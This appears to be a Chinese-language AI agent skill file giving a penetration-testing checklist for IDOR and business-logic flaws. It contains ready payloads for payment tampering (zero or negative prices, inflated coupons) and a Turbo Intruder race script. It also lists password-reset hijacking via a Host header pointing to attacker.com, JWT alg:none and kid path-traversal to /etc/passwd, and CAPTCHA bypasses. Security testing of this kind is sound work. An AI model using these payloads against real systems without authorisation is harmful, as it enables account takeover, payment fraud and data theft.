---
name: idor-testing
description: IDOR越权与业务逻辑漏洞测试，覆盖IDOR检测→支付篡改→密码重置→会话管理→验证码缺陷→竞争条件全流程
---

# IDOR与业务逻辑漏洞测试

## 概述

越权漏洞和业务逻辑漏洞是最容易被忽视的高危漏洞类型。本技能覆盖从IDOR检测到支付逻辑篡改的完整测试方法。

## 1. IDOR (不安全的直接对象引用)

### 1.1 常见IDOR位置

```
用户ID:    /user/profile?id=123 → 改为?id=124
订单号:    /orders/1001 → 改为/orders/1002
文件路径:  /download?file=report_123.pdf
API:      /api/v1/users/123 → /api/v1/users/124
UUID:     /api/invoice/550e8400-e29b-41d4-a716-446655440000
```

### 1.2 检测方法

```bash
# 1. 创建2个账号, 用A的资源ID访问B
# 2. Burp Intruder遍历ID范围
# 3. 关注响应大小差异 (相同大小=可能有数据泄露)
# 4. 无直接ID时试替代标识符: email/username/uuid
```

## 2. 支付逻辑漏洞

### 2.1 价格篡改

```
# 修改请求参数:
price=100 → price=0.01
total=100 → total=1
amount=100 → amount=-100 (负数退款)

# 修改数量:
quantity=1 → quantity=0.001 (四舍五入)
quantity=1 → quantity=-1

# 修改优惠券:
coupon=FIXED10 → coupon=FIXED100
coupon_amount=10 → coupon_amount=99999
```

### 2.2 竞争条件

```
# 并发请求绕过限制:
# 1. 同时发送多个下单请求
# 2. 优惠券被多次使用
# 3. 库存竞争: 最后一个库存被多个用户购买

# Turbo Intruder 竞争脚本
def queueRequests(target, ...):
    engine = RequestEngine(...)
    for i in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

## 3. 密码重置攻击

```
# 1. 修改请求中的用户标识
   email=victim@x.com → email=hacker@x.com (重置链接发到攻击者)

# 2. 修改重置链接参数
   /reset?token=xxx&email=victim@x.com → 改为hacker@x.com

# 3. Host头投毒
   Host: attacker.com → 重置链接指向攻击者服务器

# 4. 暴力破解重置Token
   # 如果token只有6位数字 → 可爆破

# 5. 响应中包含重置链接
   # 检查响应体/头是否含token
```

## 4. 会话管理缺陷

```
# 1. 未失效: 登出后仍可使用旧Cookie
# 2. 会话固定: 登录前后Session ID不变
# 3. 并发登录: 修改密码后其他会话不断开
# 4. JWT攻击:
    - 算法混淆: alg:RS256 → alg:HS256 (用公钥签名)
    - 空算法: alg:none
    - 密钥爆破: HS256弱密钥
    - kid注入: ../../etc/passwd
```

## 5. 验证码缺陷

```
# 1. 不刷新: 验证码可重复使用
# 2. 前端验证: 拦截响应修改为true
# 3. 验证码在响应中: 检查响应体/头
# 4. 条件竞争: 验证码5分钟有效, 并发暴力破解
```

---

*参考: PortSwigger Business Logic + 实战经验整理*
